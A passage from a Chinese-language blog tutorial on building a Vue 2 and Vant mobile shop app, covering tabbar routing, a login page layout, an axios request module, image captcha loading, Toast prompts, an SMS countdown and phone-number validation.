src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408281711591.png" alt="image-20240828171139419" style="zoom: 50%;"></p><h2 id="二级路由配置"><a class="markdownIt-Anchor" href="#二级路由配置"></a> 二级路由配置</h2><h3 id="实现底部导航栏-tabbar"><a class="markdownIt-Anchor" href="#实现底部导航栏-tabbar"></a> 实现底部导航栏 Tabbar</h3><p>配置二级路由之前需要完成底部 Tabbar 栏的设计，可以结合 vant 官网文档进行设计。<a href="https://youzan.github.io/vant/v2/">vant2 官网</a><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408281712602.png" alt="image-20240828171252550"></p><h3 id="实现二级路由配置"><a class="markdownIt-Anchor" href="#实现二级路由配置"></a> 实现二级路由配置</h3><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408281741912.png" alt="image-20240828174123840"></p><p>在组件中的 vant2 的 Tabbar 要实现路由模式如下：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408281744188.png" alt="image-20240828174450143"></p><p>于是有：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">    &lt;van-tabbar route v-model="active" active-color="#ee0a24" inactive-color="#000"&gt;</span><br><span class="line">      &lt;van-tabbar-item to= "/home" icon="gem-o"&gt;首页&lt;/van-tabbar-item&gt;</span><br><span class="line">      &lt;van-tabbar-item to= "/category" icon="apps-o"&gt;分类页&lt;/van-tabbar-item&gt;</span><br><span class="line">      &lt;van-tabbar-item to= "/cart" icon="shopping-cart-o"&gt;购物车&lt;/van-tabbar-item&gt;</span><br><span class="line">      &lt;van-tabbar-item to= "/user" icon="user-o"&gt;我的&lt;/van-tabbar-item&gt;</span><br><span class="line">    &lt;/van-tabbar&gt;</span><br><span class="line">  &lt;/div&gt;</span><br></pre></td></tr></tbody></table></figure><p>最后优化路由逻辑，将默认匹配的页面重定向到 home</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408281748077.png" alt="image-20240828174814027"></p><h2 id="登录静态页"><a class="markdownIt-Anchor" href="#登录静态页"></a> 登录静态页</h2><p>新建 <code>styles/common.less</code> 重置默认样式（可以对一些想要多组件生效的样式进行重新调整）</p><figure class="highlight less"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 重置默认样式</span></span><br><span class="line">* {</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">box-sizing</span>: borde-box;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 文字溢出省略号</span></span><br><span class="line"><span class="selector-class">.text-ellipsis-2</span> {</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  -webkit-line-clamp: 2;</span><br><span class="line">  <span class="attribute">text-overflow</span>: ellipsis;</span><br><span class="line">  <span class="attribute">display</span>: -webkit-box;</span><br><span class="line">  -webkit-box-orient: vertical;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>导入于 main.js 中：<code>import '@/styles/common.less'</code></p><p>接着准备一些素材图片于 assets<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408281759229.png" alt="image-20240828175944181"></p><h3 id="配置头部-navbar"><a class="markdownIt-Anchor" href="#配置头部-navbar"></a> 配置头部 NavBar</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 头部 NavBar --&gt;</span><br><span class="line">&lt;van-nav-bar</span><br><span class="line">  title="尊敬的用户，请登录"</span><br><span class="line">  left-arrow</span><br><span class="line">  @click-left="$router.go(-1)"</span><br><span class="line">/&gt;</span><br></pre></td></tr></tbody></table></figure><p><code>$router.go(-1)</code> 的作用是返回上一页。</p><p>接着将左边的返回符号 left-arrow 颜色样式改为灰色 #333，于是找到 common.less 进行编写（两个类名增加权重）</p><figure class="highlight less"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加导航的通用样式</span></span><br><span class="line"><span class="selector-class">.van-nav-bar</span> {</span><br><span class="line">  <span class="selector-class">.van-nav-bar__arrow</span> {</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#333</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这样的好处是，一旦配置好了将来其他页面使用到导航栏此处的返回颜色都是我们此时配好的颜色。这就是通用样式的覆盖。</p><h3 id="完善主体"><a class="markdownIt-Anchor" href="#完善主体"></a> 完善主体</h3><p>接着编写主体的静态结构：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class="login"&gt;</span><br><span class="line">    &lt;!-- 头部 NavBar --&gt;</span><br><span class="line">    &lt;van-nav-bar</span><br><span class="line">      title="尊敬的用户，请登录"</span><br><span class="line">      left-arrow</span><br><span class="line">      @click-left="$router.go(-1)"</span><br><span class="line">    /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 主体部分 自定义 --&gt;</span><br><span class="line">    &lt;div class="container"&gt;</span><br><span class="line">      &lt;div class="title"&gt;</span><br><span class="line">        &lt;h3&gt;手机号登录&lt;/h3&gt;</span><br><span class="line">        &lt;p&gt;未注册的手机号登录后将自动注册&lt;/p&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">      &lt;div class="form"&gt;</span><br><span class="line">        &lt;div class="form-item"&gt;</span><br><span class="line">          &lt;input</span><br><span class="line">            class="inp"</span><br><span class="line">            maxlength="11"</span><br><span class="line">            placeholder="请输入手机号码"</span><br><span class="line">            type="text"</span><br><span class="line">          /&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class="form-item"&gt;</span><br><span class="line">          &lt;input</span><br><span class="line">            class="inp"</span><br><span class="line">            maxlength="5"</span><br><span class="line">            placeholder="请输入图形验证码"</span><br><span class="line">            type="text"</span><br><span class="line">          /&gt;</span><br><span class="line">          &lt;img src="@/assets/code.png" alt="" /&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class="form-item"&gt;</span><br><span class="line">          &lt;input class="inp" placeholder="请输入短信验证码" type="text" /&gt;</span><br><span class="line">          &lt;button&gt;获取验证码&lt;/button&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">      &lt;div class="login-btn"&gt;登录&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default {</span><br><span class="line">  name: "LoginIndex",</span><br><span class="line">};</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang="less" scoped&gt;</span><br><span class="line">.container {</span><br><span class="line">  padding: 49px 29px;</span><br><span class="line"></span><br><span class="line">  .title {</span><br><span class="line">    margin-bottom: 20px;</span><br><span class="line">    h3 {</span><br><span class="line">      font-size: 26px;</span><br><span class="line">      font-weight: normal;</span><br><span class="line">    }</span><br><span class="line">    p {</span><br><span class="line">      line-height: 40px;</span><br><span class="line">      font-size: 14px;</span><br><span class="line">      color: #b8b8b8;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  .form-item {</span><br><span class="line">    border-bottom: 1px solid #f3f1f2;</span><br><span class="line">    padding: 8px;</span><br><span class="line">    margin-bottom: 14px;</span><br><span class="line">    display: flex;</span><br><span class="line">    align-items: center;</span><br><span class="line">    .inp {</span><br><span class="line">      display: block;</span><br><span class="line">      border: none;</span><br><span class="line">      outline: none;</span><br><span class="line">      height: 32px;</span><br><span class="line">      font-size: 14px;</span><br><span class="line">      flex: 1;</span><br><span class="line">    }</span><br><span class="line">    img {</span><br><span class="line">      width: 94px;</span><br><span class="line">      height: 31px;</span><br><span class="line">    }</span><br><span class="line">    button {</span><br><span class="line">      height: 31px;</span><br><span class="line">      border: none;</span><br><span class="line">      font-size: 13px;</span><br><span class="line">      color: #cea26a;</span><br><span class="line">      background-color: transparent;</span><br><span class="line">      padding-right: 9px;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  .login-btn {</span><br><span class="line">    width: 100%;</span><br><span class="line">    height: 42px;</span><br><span class="line">    margin-top: 39px;</span><br><span class="line">    background: linear-gradient(90deg, #ecb53c, #ff9211);</span><br><span class="line">    color: #fff;</span><br><span class="line">    border-radius: 39px;</span><br><span class="line">    box-shadow: 0 10px 20px 0 rgba(0, 0, 0, 0.1);</span><br><span class="line">    letter-spacing: 2px;</span><br><span class="line">    display: flex;</span><br><span class="line">    justify-content: center;</span><br><span class="line">    align-items: center;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><p>页面效果如下：</p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408281818338.png" alt="image-20240828181803280" style="zoom: 80%;"><p>图形验证码暂时写死，短信验证码暂时不作处理</p><h3 id="完善登录逻辑"><a class="markdownIt-Anchor" href="#完善登录逻辑"></a> 完善登录逻辑</h3><p>登录页面一共有三个请求需要发送，图形验证码、短信验证码和登录请求。我们使用 axios 来请求后端接口，一般都会对 axios 进行一些配置（配置基础地址，请求响应拦截器等），于是封装 axios 为一个 request 模块，便于维护。以后使用 axios 都是创建实例去请求，这样多个实例相互独立，互不干扰。</p><ul><li><a href="https://www.axios-http.cn/docs/instance">axios 中文文档</a></li></ul><p>新建 request.js 于 utils 包下，创建一个 axios 实例（cv 中文文档中的实例和拦截器进行改造）：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">"axios"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建axios实例</span></span><br><span class="line"><span class="keyword">const</span> instance = axios.<span class="title function_">create</span>({</span><br><span class="line">  <span class="comment">// 查看接口文档改造</span></span><br><span class="line">  <span class="attr">baseURL</span>: <span class="string">"http://smart-shop.itheima.net/index.php?s=/api"</span>,</span><br><span class="line">  <span class="attr">timeout</span>: <span class="number">5000</span>,</span><br><span class="line">  <span class="attr">headers</span>: { <span class="attr">platform</span>: <span class="string">"h5"</span> },</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义配置 - 请求/响应 拦截器 （如果希望不污染原本的axios需要将axios改为instance实例）</span></span><br><span class="line"><span class="comment">// 添加请求拦截器</span></span><br><span class="line">instance.<span class="property">interceptors</span>.<span class="property">request</span>.<span class="title function_">use</span>(</span><br><span class="line">  <span class="keyword">function</span> (<span class="params">config</span>) {</span><br><span class="line">    <span class="comment">// 在发送请求之前做些什么</span></span><br><span class="line">    <span class="keyword">return</span> config;</span><br><span class="line">  },</span><br><span class="line">  <span class="keyword">function</span> (<span class="params">error</span>) {</span><br><span class="line">    <span class="comment">// 对请求错误做些什么</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(error);</span><br><span class="line">  }</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加响应拦截器</span></span><br><span class="line">instance.<span class="property">interceptors</span>.<span class="property">response</span>.<span class="title function_">use</span>(</span><br><span class="line">  <span class="keyword">function</span> (<span class="params">response</span>) {</span><br><span class="line">    <span class="comment">// 2xx 范围内的状态码都会触发该函数。</span></span><br><span class="line">    <span class="comment">// 对响应数据做点什么 (默认axios会对响应多包装一层data，所以这里需要取出data)</span></span><br><span class="line">    <span class="keyword">return</span> response.<span class="property">data</span>;</span><br><span class="line">  },</span><br><span class="line">  <span class="keyword">function</span> (<span class="params">error</span>) {</span><br><span class="line">    <span class="comment">// 超出 2xx 范围的状态码都会触发该函数。</span></span><br><span class="line">    <span class="comment">// 对响应错误做点什么</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(error);</span><br><span class="line">  }</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 导出配置好的示例</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> instance;</span><br></pre></td></tr></tbody></table></figure><p>响应器中，response.data 原本为 response，这里改为上文是因为 axios 默认会对响应多包装一层 data，所以这里需要取出 data</p><p>接着回到登录页面 index.vue 上，导入 request 模块，异步检查一下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">import request from "@/utils/request";</span><br><span class="line"></span><br><span class="line">export default {</span><br><span class="line">  name: "LoginIndex",</span><br><span class="line">  async created() {</span><br><span class="line">    const res = await request.get("/captcha/image");</span><br><span class="line">    console.log(res);</span><br><span class="line">  },</span><br><span class="line">};</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><p>调试返回如下</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408281850640.png" alt="image-20240828185016590"></p><h4 id="解析-base64-并完善点击刷新图片验证码"><a class="markdownIt-Anchor" href="#解析-base64-并完善点击刷新图片验证码"></a> 解析 base64 并完善点击刷新图片验证码</h4><p>由于提交的图形验证码必须带 key 才能让后端进行唯一校验，所以在 data 中提供：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">data</span> () {</span><br><span class="line">  <span class="keyword">return</span> {</span><br><span class="line">    <span class="attr">picCode</span>: <span class="string">''</span>, <span class="comment">// 用户输入的图形验证码</span></span><br><span class="line">    <span class="attr">picKey</span>: <span class="string">''</span>, <span class="comment">// 图形验证码的key</span></span><br><span class="line">    <span class="attr">picUrl</span>: <span class="string">''</span> <span class="comment">// 存放要渲染的图形验证码的url</span></span><br><span class="line">  }</span><br><span class="line">},</span><br></pre></td></tr></tbody></table></figure><p>接着进行响应结果的解构，存储好数据以便后续提交后端进行校验</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">async</span> <span class="title function_">created</span> () {</span><br><span class="line">   <span class="variable language_">this</span>.<span class="title function_">getPicCode</span>()</span><br><span class="line"> },</span><br><span class="line"><span class="attr">methods</span>: {</span><br><span class="line">   <span class="keyword">async</span> <span class="title function_">getPicCode</span> () {</span><br><span class="line">     <span class="keyword">const</span> { <span class="attr">data</span>: { base64, <span class="title class_">Key</span> } } = <span class="keyword">await</span> request.<span class="title function_">get</span>(<span class="string">'/captcha/image'</span>)</span><br><span class="line">     <span class="variable language_">this</span>.<span class="property">picUrl</span> = base64</span><br><span class="line">     <span class="variable language_">this</span>.<span class="property">picKey</span> = <span class="title class_">Key</span></span><br><span class="line">   }</span><br><span class="line"> }</span><br></pre></td></tr></tbody></table></figure><p>完善 template 相关代码：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class="form-item"&gt;</span><br><span class="line">   &lt;input v-model="picCode" class="inp" maxlength="5" placeholder="请输入图形验证码" type="text"&gt;</span><br><span class="line">   &lt;img v-if="picUrl" :src="picUrl" @click="getPicCode" alt=""&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></tbody></table></figure><p>封装登录请求到 api 包下，新建 login.js</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 登录相关接口请求</span></span><br><span class="line"><span class="keyword">import</span> request <span class="keyword">from</span> <span class="string">"@/utils/request"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">getPicCode</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="keyword">return</span> request.<span class="title function_">get</span>(<span class="string">"/captcha/image"</span>);</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>使用时按需导入。于是到登录页 index.js 中改 <code>import request from '@/utils/request'</code> 为 <code>import { getPicCode } from '@/api/login'</code> 并修改调用语句：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">methods</span>: {</span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">getPicCode</span> () {</span><br><span class="line">    <span class="keyword">const</span> { <span class="attr">data</span>: { base64, <span class="title class_">Key</span> } } = <span class="keyword">await</span> <span class="title function_">getPicCode</span>()</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">picUrl</span> = base64</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">picKey</span> = <span class="title class_">Key</span></span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>上述语句不会因为重名冲突，我们需要知道的是，如果是引入的 getPicCode 前面是不带 this 的，而自身的 getPicCode 是需要在前面加上 this. 的</p><h3 id="toast-轻提示"><a class="markdownIt-Anchor" href="#toast-轻提示"></a> Toast 轻提示</h3><p>校验手机号是否输入、是否输入格式正确等并给予提示。</p><p>使用 vant 库中的 Toast 轻提示，完成提示显示。需要注意的是他的两种调用方式：</p><ol><li>Toast (' 提示内容 ');</li><li>this.<span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to 'error': Unicode text character &quot;提&quot; used in math mode [unicodeTextInMathMode] at position 8: toast('提̲示文案');  引入 Toas…">toast (' 提示文案 ');  引入 Toast 组件后，会自动在 Vue 的 prototype 上挂载 `</span>toast` 方法，便于在组件内调用。</li></ol><p>这两种调用，第一种是任意地方都可以调用显示出提示内容，第二种是只有组件内才可以显示提示内容。Toast 默认采用单例模式，即同一时间只会存在一个 Toast，如果需要在同一时间弹出多个 Toast，可以参考下面的示例：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Toast</span>.<span class="title function_">allowMultiple</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> toast1 = <span class="title class_">Toast</span>(<span class="string">"第一个 Toast"</span>);</span><br><span class="line"><span class="keyword">const</span> toast2 = <span class="title class_">Toast</span>.<span class="title function_">success</span>(<span class="string">"第二个 Toast"</span>);</span><br><span class="line"></span><br><span class="line">toast1.<span class="title function_">clear</span>();</span><br><span class="line">toast2.<span class="title function_">clear</span>();</span><br></pre></td></tr></tbody></table></figure><h3 id="短信验证倒计时"><a class="markdownIt-Anchor" href="#短信验证倒计时"></a> 短信验证倒计时</h3><p>点击获取验证码之后要开始倒计时，一分钟只能发送一次。给获取短信验证码的按钮注册点击事件并改写显示文字</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class="form-item"&gt;</span><br><span class="line">   &lt;input class="inp" placeholder="请输入短信验证码" type="text"&gt;</span><br><span class="line">   &lt;button @click="getCode"&gt;{{ totalTime === timeNow ? '获取验证码' : `${timeNow}秒后重试` }}&lt;/button&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></tbody></table></figure><p>提供短信验证码获取函数 getCode</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 短信验证码获取</span></span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">getCode</span> () {</span><br><span class="line">    <span class="comment">// 只有当计时器处于未开启状态并且当前时间和总时间一致时说明可以开启倒计时</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">timerId</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">timeNow</span> === <span class="variable language_">this</span>.<span class="property">totalTime</span>) {</span><br><span class="line">      <span class="comment">// 开启计时器</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">timerId</span> = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">timeNow</span>--</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">timeNow</span> &lt;= <span class="number">0</span>) {</span><br><span class="line">          <span class="comment">// 停止计时器</span></span><br><span class="line">          <span class="built_in">clearInterval</span>(<span class="variable language_">this</span>.<span class="property">timerId</span>)</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">timerId</span> = <span class="literal">null</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">timeNow</span> = <span class="variable language_">this</span>.<span class="property">totalTime</span></span><br><span class="line">        }</span><br><span class="line">      }, <span class="number">1000</span>)</span><br><span class="line">      <span class="comment">// 获取成功给予提示</span></span><br><span class="line">      <span class="title class_">Toast</span>(<span class="string">'获取短信验证码成功'</span>)</span><br><span class="line">    }</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p>并考虑到性能问题，于是增加在用户离开登录页面之后清除定时器的功能，实现在 destroy 生命函数</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">destroyed</span> () {</span><br><span class="line">    <span class="comment">// 当用户退出登录页面清除定时器</span></span><br><span class="line">    <span class="built_in">clearInterval</span>(<span class="variable language_">this</span>.<span class="property">timerId</span>)</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><h3 id="手机号和图形验证码类型校验"><a class="markdownIt-Anchor" href="#手机号和图形验证码类型校验"></a> 手机号和图形验证码类型校验</h3><p>由于前端无法校验具体，只能校验数据类型和长度。所以新增两个正则数据和绑定用户输入的手机号：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 手机号正则 1开头 3-9为第二位 接着9位数字</span></span><br><span class="line">      <span class="attr">reg_phone</span>: <span class="regexp">/^1[3-9]\d{9}$/</span>,</span><br><span class="line">      <span class="attr">reg_picCode</span>: <span class="regexp">/^\w{4}$/</span>, <span class="comment">// 图形正则</span></span><br><span class="line">      <span class="attr">phoneNum</span>: <span class="string">''</span>, <span class="comment">// 用户输入的手机号码</span></span><br></pre></td></tr></tbody></table></figure><p>增加校验的函数 validFn</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 校验手机号和图形验证码</span></span><br><span class="line">    <span class="title function_">validFn</span> () {</span><br><span class="line">      <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">reg_phone</span>.<span class="title function_">test</span>(<span class="variable language_">this</span>.<span class="property">phoneNum</span>)) {</span><br><span class="line">        <span class="title class_">Toast</span>(<span class="string">'请输入正确的手机号！'</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">reg_picCode</span>.<span class="title function_">test</span>(<span class="variable language_">this</span>.<span class="property">picCode</span>)) {</span><br><span class="line">        <span class="title class_">Toast</span>(<span class="string">'图形验证码错误！'</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    },</span><br></pre></td></tr></tbody></table></figure><p>并在短信验证码获取函数 